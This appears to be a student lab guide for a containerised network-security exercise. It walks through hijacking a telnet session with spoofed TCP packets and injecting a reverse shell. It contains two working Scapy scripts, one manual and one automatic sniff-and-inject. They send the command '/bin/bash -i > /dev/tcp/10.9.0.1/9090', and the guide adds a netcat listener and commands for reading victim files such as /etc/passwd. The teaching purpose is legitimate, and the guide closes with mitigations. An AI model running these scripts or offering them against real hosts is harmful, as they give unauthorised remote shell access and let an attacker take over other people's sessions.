# Task 4: Reverse Shell via TCP Session Hijacking - Updated Guide

## Overview

Task 4 combines Tasks 2 & 3 concepts with a reverse shell attack:

1. **Establish telnet connection** between user1 (10.9.0.6) and victim (10.9.0.5)
2. **Hijack the session** using spoofed TCP packets
3. **Inject reverse shell command** into the hijacked session
4. **Connect back** from victim to attacker's netcat listener

---

## Architecture

```
Attacker (VM) 
  ├─ Listening on port 9090 (netcat)
  └─ Running session hijacking scripts
      └─ Injects: /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1

Victim Container (10.9.0.5)
  └─ Executes reverse shell command
      └─ Connects back to attacker:9090
```

---

## Prerequisites

✅ Docker containers running
✅ Netcat installed on VM: `sudo apt install netcat-openbsd`
✅ Wireshark available for packet capture
✅ The automatic session hijacking script from Task 3 working

---

## Step-by-Step Execution

### Step 1: Start Netcat Listener on Attacker (VM)

```bash
nc -lnv 9090
```

**Expected output:**
```
Listening on 0.0.0.0 9090
```

Keep this running in a terminal. This is where the reverse shell will connect.

---

### Step 2: Prepare Attacker Container

Open a new terminal:
```bash
docksh <attacker_id>  # e.g., docksh b0730
cd /volumes
```

---

### Step 3: Start Telnet from User1 to Victim

In another terminal:
```bash
docksh <user1_id>     # e.g., docksh 3f7e
telnet 10.9.0.5
# Login: seed / password: dees
```

The telnet session should now be active.

---

### Step 4: Capture Network Traffic with Wireshark

On the VM:
```bash
wireshark &
# Select interface: br-983f4e838608
# Start capture
```

**Filter:** `tcp and port 23` (to see telnet traffic only)

---

### Step 5: Generate Traffic

From the telnet session, type some characters:
```
echo "test" 
```

This generates packets that Wireshark can capture.

---

### Step 6: Extract TCP Parameters

In Wireshark, find a packet from **10.9.0.6 → 10.9.0.5** and note:
- **Sequence Number** (SEQ)
- **Acknowledgement Number** (ACK)  
- **Source Port** (SPORT)

---

### Step 7: Create the Hijacking Script

Edit `/volumes/hijack_with_reverse_shell.py` on the VM:

```python
#!/usr/bin/env python3
"""
Task 4: TCP Session Hijacking with Reverse Shell Injection
"""
from scapy.all import *

# From Wireshark capture
SRC_IP  = "10.9.0.6"   # telnet client
DST_IP  = "10.9.0.5"   # telnet server
SPORT   = 12345         # GET FROM WIRESHARK
DPORT   = 23            # telnet port
SEQ     = 0             # GET FROM WIRESHARK
ACK     = 0             # GET FROM WIRESHARK

# Reverse shell command
# This connects the victim's bash shell back to attacker:9090
REVERSE_SHELL_CMD = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"

# Create spoofed packet
ip  = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SPORT, dport=DPORT, flags="A", seq=SEQ, ack=ACK)
pkt = ip / tcp / REVERSE_SHELL_CMD

print(f"[*] Injecting reverse shell into {SRC_IP}:{SPORT} → {DST_IP}:{DPORT}")
print(f"[*] Command: {REVERSE_SHELL_CMD.strip()}")
print(f"[*] Sequence: {SEQ}, ACK: {ACK}")
send(pkt, verbose=0)
print("[+] Reverse shell command injected!")
```

---

### Step 8: Run the Hijacking Script

From the attacker container:
```bash
sudo python3 /volumes/hijack_with_reverse_shell.py
```

---

### Step 9: Observe Reverse Shell Connection

Look at the **netcat** window (Step 1). You should see:

```
Connection received on 10.9.0.5 49382
$ 
```

The `$` prompt indicates you now have a shell on the victim!

---

### Step 10: Verify Access with Commands

In the netcat reverse shell, try:

```bash
whoami          # Show current user
hostname        # Show victim hostname
pwd             # Show working directory
cat /etc/passwd # Read system file
ls -la /tmp     # List directory
```

All commands execute on the victim machine (10.9.0.5).

---

## Alternative: Automatic Hijacking

For advanced students, create an automatic version:

```python
#!/usr/bin/env python3
from scapy.all import *

IFACE = "br-983f4e838608"
FILTER = "tcp and dst port 23"
injected = False
REVERSE_SHELL = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"

def hijack(pkt):
    global injected
    if injected:
        return
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    
    ip_layer = pkt[IP]
    tcp_layer = pkt[TCP]
    payload_len = len(tcp_layer[Raw].load)
    next_seq = tcp_layer.seq + payload_len
    
    ip = IP(src=ip_layer.src, dst=ip_layer.dst)
    tcp = TCP(sport=tcp_layer.sport, dport=tcp_layer.dport,
              flags="A", seq=next_seq, ack=tcp_layer.ack)
    spoof_pkt = ip / tcp / REVERSE_SHELL
    send(spoof_pkt, verbose=0)
    injected = True
    print("[+] Reverse shell injected!")

print("[*] Sniffing for telnet traffic...")
sniff(iface=IFACE, filter=FILTER, prn=hijack, store=False)
```

Run it:
```bash
sudo python3 /volumes/hijack_reverse_auto.py &
# Then start telnet and generate traffic
```

---

## Reverse Shell Command Breakdown

```
/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
```

| Component | Meaning |
|-----------|---------|
| `/bin/bash -i` | Start interactive bash shell |
| `> /dev/tcp/10.9.0.1/9090` | Redirect stdout to attacker IP:port |
| `0<&1` | Redirect stdin from TCP connection |
| `2>&1` | Redirect stderr to stdout (to TCP) |

**Result:** All I/O flows over TCP to the attacker's listener.

---

## Screenshots to Capture

1. **Netcat listener starting:** `nc -lnv 9090`
2. **Telnet session established:** From user1 to victim
3. **Wireshark capture:** Showing telnet traffic
4. **Injected command:** Running hijacking script
5. **Connection received:** In netcat window
6. **Shell prompt:** Showing `$` prompt
7. **Command execution:** Running `whoami`, `hostname`, etc.
8. **Proof of access:** Reading victim files/directories

---

## Troubleshooting

### netcat: "Address already in use"
```bash
# Kill any existing netcat process
pkill nc
# Or use a different port
nc -lnv 9091
```

### "bash: /bin/bash: command not found" on injection
- Might be an issue with spaces or escaping
- Try simpler commands first: `\r id \r` or `\r ls /tmp \r`

### Connection not received at netcat
- Check sequence number was correct from Wireshark
- Verify victim can reach attacker IP (10.9.0.1)
- Make sure netcat is actually listening: `netstat -tlnp | grep 9090`

### Shell appears but commands don't work
- Sometimes reverse shell needs warmup
- Try: `echo test`
- Or try: `exec bash`

---

## Key Points for Report

1. **Vulnerability:** TCP lacks authentication; sequence numbers are predictable
2. **Attack Chain:** Session hijacking → Command injection → Reverse shell
3. **Impact:** Attacker gains full shell access to victim machine
4. **Mitigation:** Use SSH instead of telnet; enable TCP sequence randomization

---

## Files

- VM: `/volumes/hijack_with_reverse_shell.py` (manual)
- VM: `/volumes/hijack_reverse_auto.py` (automatic)
- Containers: All scripts run inside attacker container

---

Good luck! 🚀
